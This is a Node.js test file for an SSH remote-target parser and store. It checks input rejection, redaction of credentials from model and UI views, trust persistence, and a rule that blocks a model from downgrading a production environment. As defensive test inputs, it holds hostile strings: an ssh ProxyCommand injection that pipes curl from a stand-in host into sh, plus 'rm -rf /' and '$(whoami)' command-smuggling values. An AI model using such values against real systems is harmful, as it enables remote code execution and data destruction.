"use strict";

const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");

const {
  createRemoteTarget,
  parseAdHocTarget,
  sanitizeAuthRef,
  modelView,
  publicView,
  applyModelSuggestion,
} = require("./remoteTarget.cjs");
const { createRemoteTargetStore, STORE_FILE } = require("./remoteTargetStore.cjs");

// ── Ad-hoc parsing ───────────────────────────────────────────────────────────

test("parses user@host, host, ports, and ssh-prefixed forms", () => {
  assert.deepEqual(parseAdHocTarget("deploy@example.com"), {
    username: "deploy",
    host: "example.com",
    port: 22,
  });
  assert.deepEqual(parseAdHocTarget("example.com"), { username: "", host: "example.com", port: 22 });
  assert.deepEqual(parseAdHocTarget("deploy@example.com:2222"), {
    username: "deploy",
    host: "example.com",
    port: 2222,
  });
  assert.deepEqual(parseAdHocTarget("ssh deploy@10.0.0.5 -p 2200"), {
    username: "deploy",
    host: "10.0.0.5",
    port: 2200,
  });
});

test("hostile ad-hoc strings never become targets", () => {
  // Option injection: a host that would become an ssh flag.
  assert.equal(parseAdHocTarget("-oProxyCommand=curl evil.sh|sh"), null);
  assert.equal(parseAdHocTarget("user@-evil.example.com"), null);
  // Shell metacharacters in host or user.
  assert.equal(parseAdHocTarget("user@host;rm -rf /"), null);
  assert.equal(parseAdHocTarget("$(whoami)@example.com"), null);
  assert.equal(parseAdHocTarget("user@exa mple.com"), null);
  // Out-of-range port.
  assert.equal(parseAdHocTarget("user@example.com:99999"), null);
});

// ── Model construction and redaction ─────────────────────────────────────────

test("createRemoteTarget canonicalizes and rejects unsafe hosts", () => {
  const target = createRemoteTarget({ host: "dev.example.com", username: "deploy" });
  assert.equal(target.environment, "unknown");
  assert.equal(target.port, 22);
  assert.equal(target.name, "deploy@dev.example.com");
  assert.throws(() => createRemoteTarget({ host: "-evil.com" }), TypeError);
  assert.throws(() => createRemoteTarget({ host: "host;rm -rf /" }), TypeError);
});

test("authRef can never carry secret material", () => {
  // A private-key BODY masquerading as a path is stripped to a safe default.
  const pem = "-----BEGIN OPENSSH PRIVATE KEY-----\nAAAA...\n-----END OPENSSH PRIVATE KEY-----";
  assert.deepEqual(sanitizeAuthRef({ kind: "keyFile", path: pem }), { kind: "default" });
  // Unknown kinds collapse to default; extra fields are dropped.
  const ref = sanitizeAuthRef({ kind: "password", password: "hunter2" });
  assert.equal(ref.kind, "default");
  assert.equal("password" in ref, false);
  // A legitimate key PATH (a reference) survives.
  assert.deepEqual(sanitizeAuthRef({ kind: "keyFile", path: "~/.ssh/id_ed25519" }), {
    kind: "keyFile",
    path: "~/.ssh/id_ed25519",
  });
});

test("modelView exposes identity and environment, never address or auth", () => {
  const target = createRemoteTarget({
    name: "Production API Server",
    host: "10.1.2.3",
    username: "root",
    environment: "production",
    authRef: { kind: "keyFile", path: "~/.ssh/prod_key" },
    trustedHostFingerprint: "SHA256:abc",
  });
  const view = modelView(target);
  assert.deepEqual(view, {
    id: target.id,
    name: "Production API Server",
    environment: "production",
    trusted: true,
  });
  const json = JSON.stringify(view);
  assert.equal(json.includes("10.1.2.3"), false);
  assert.equal(json.includes("prod_key"), false);
  assert.equal(json.includes("SHA256"), false);
});

test("publicView (UI) shows the address but never authRef details or raw fingerprint", () => {
  const target = createRemoteTarget({
    host: "dev.example.com",
    username: "deploy",
    authRef: { kind: "keyFile", path: "/Users/me/.ssh/id_rsa" },
    trustedHostFingerprint: "SHA256:xyz",
  });
  const view = publicView(target);
  assert.equal(view.host, "dev.example.com");
  assert.equal(view.authKind, "keyFile");
  assert.equal(view.trusted, true);
  const json = JSON.stringify(view);
  assert.equal(json.includes("id_rsa"), false);
  assert.equal(json.includes("SHA256:xyz"), false);
});

// ── Environment downgrade protection ─────────────────────────────────────────

test("a model suggestion can raise strictness but never downgrade production", () => {
  assert.deepEqual(applyModelSuggestion("development", "production"), {
    environment: "production",
    changed: true,
  });
  assert.deepEqual(applyModelSuggestion("production", "development"), {
    environment: "production",
    changed: false,
  });
  assert.deepEqual(applyModelSuggestion("unknown", "development"), {
    environment: "unknown",
    changed: false,
  });
  assert.deepEqual(applyModelSuggestion("staging", "nonsense"), {
    environment: "staging",
    changed: false,
  });
});

// ── Store: persistence, trust, ad-hoc resolution ─────────────────────────────

function tmpStore() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "lykn-remote-store-"));
  return { dir, store: createRemoteTargetStore({ userDataPath: dir }) };
}

test("create, list, update, remove round-trip through disk", async () => {
  const { dir, store } = tmpStore();
  store.load();
  const created = store.create({
    name: "Dev Server",
    host: "dev.example.com",
    username: "deploy",
    environment: "development",
  });
  assert.ok(created.id.startsWith("rtarget_"));
  await store.persistNow();

  const reloaded = createRemoteTargetStore({ userDataPath: dir });
  reloaded.load();
  assert.equal(reloaded.list().length, 1);
  assert.equal(reloaded.list()[0].name, "Dev Server");

  const updated = store.update(created.id, { environment: "staging" });
  assert.equal(updated.environment, "staging");
  assert.equal(store.remove(created.id), true);
  assert.equal(store.list().length, 0);
});

test("trust persists a fingerprint and survives reload; forgetTrust clears it", async () => {
  const { dir, store } = tmpStore();
  store.load();
  const t = store.create({ host: "prod.example.com", environment: "production" });
  assert.equal(store.get(t.id).trusted, false);
  const trusted = store.trustHostKey(t.id, "SHA256:AbCdEf123");
  assert.equal(trusted.trusted, true);
  await store.persistNow();

  const reloaded = createRemoteTargetStore({ userDataPath: dir });
  reloaded.load();
  assert.equal(reloaded.get(t.id).trusted, true);
  assert.equal(reloaded.getRaw(t.id).trustedHostFingerprint, "SHA256:AbCdEf123");

  store.forgetTrust(t.id);
  assert.equal(store.get(t.id).trusted, false);
});

test("a garbage fingerprint (multi-line / spaced) is rejected", () => {
  const { store } = tmpStore();
  store.load();
  const t = store.create({ host: "prod.example.com" });
  assert.equal(store.trustHostKey(t.id, "SHA256:ok\nprod.example.com ssh-rsa AAAA"), null);
  assert.equal(store.get(t.id).trusted, false);
});

test("resolveAdHoc reuses a saved target's trust when addresses match", () => {
  const { store } = tmpStore();
  store.load();
  const saved = store.create({
    host: "dev.example.com",
    username: "deploy",
    environment: "development",
  });
  store.trustHostKey(saved.id, "SHA256:devkey");
  const { target, saved: wasSaved } = store.resolveAdHoc("deploy@dev.example.com");
  assert.equal(wasSaved, true);
  assert.equal(target.id, saved.id);
  assert.equal(target.trusted, true);
});

test("resolveAdHoc mints an ephemeral UNKNOWN-environment target for a new host", () => {
  const { store } = tmpStore();
  store.load();
  const { target, saved } = store.resolveAdHoc("root@newbox.example.com");
  assert.equal(saved, false);
  assert.equal(target.environment, "unknown");
  assert.equal(target.trusted, false);
  // Ephemeral targets can be promoted to saved.
  const promoted = store.save(target.id, { name: "New Box", environment: "development" });
  assert.equal(promoted.saved, true);
  assert.equal(promoted.environment, "development");
});

test("resolveAdHoc refuses hostile strings", () => {
  const { store } = tmpStore();
  store.load();
  const out = store.resolveAdHoc("-oProxyCommand=evil");
  assert.equal(out.target, null);
  assert.equal(out.error, "unparseable_target");
});

test("a hostile on-disk record is dropped at load, not trusted", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "lykn-remote-store-"));
  fs.writeFileSync(
    path.join(dir, STORE_FILE),
    JSON.stringify({
      v: 1,
      targets: [
        { id: "rtarget_bad", host: "host;rm -rf /", username: "x" },
        { id: "rtarget_good", host: "ok.example.com", username: "deploy" },
      ],
    }),
  );
  const store = createRemoteTargetStore({ userDataPath: dir });
  store.load();
  assert.equal(store.list().length, 1);
  assert.equal(store.list()[0].host, "ok.example.com");
});

test("update never silently clears trust", () => {
  const { store } = tmpStore();
  store.load();
  const t = store.create({ host: "dev.example.com" });
  store.trustHostKey(t.id, "SHA256:abc");
  const updated = store.update(t.id, { name: "Renamed", trustedHostFingerprint: "" });
  assert.equal(updated.trusted, true);
});
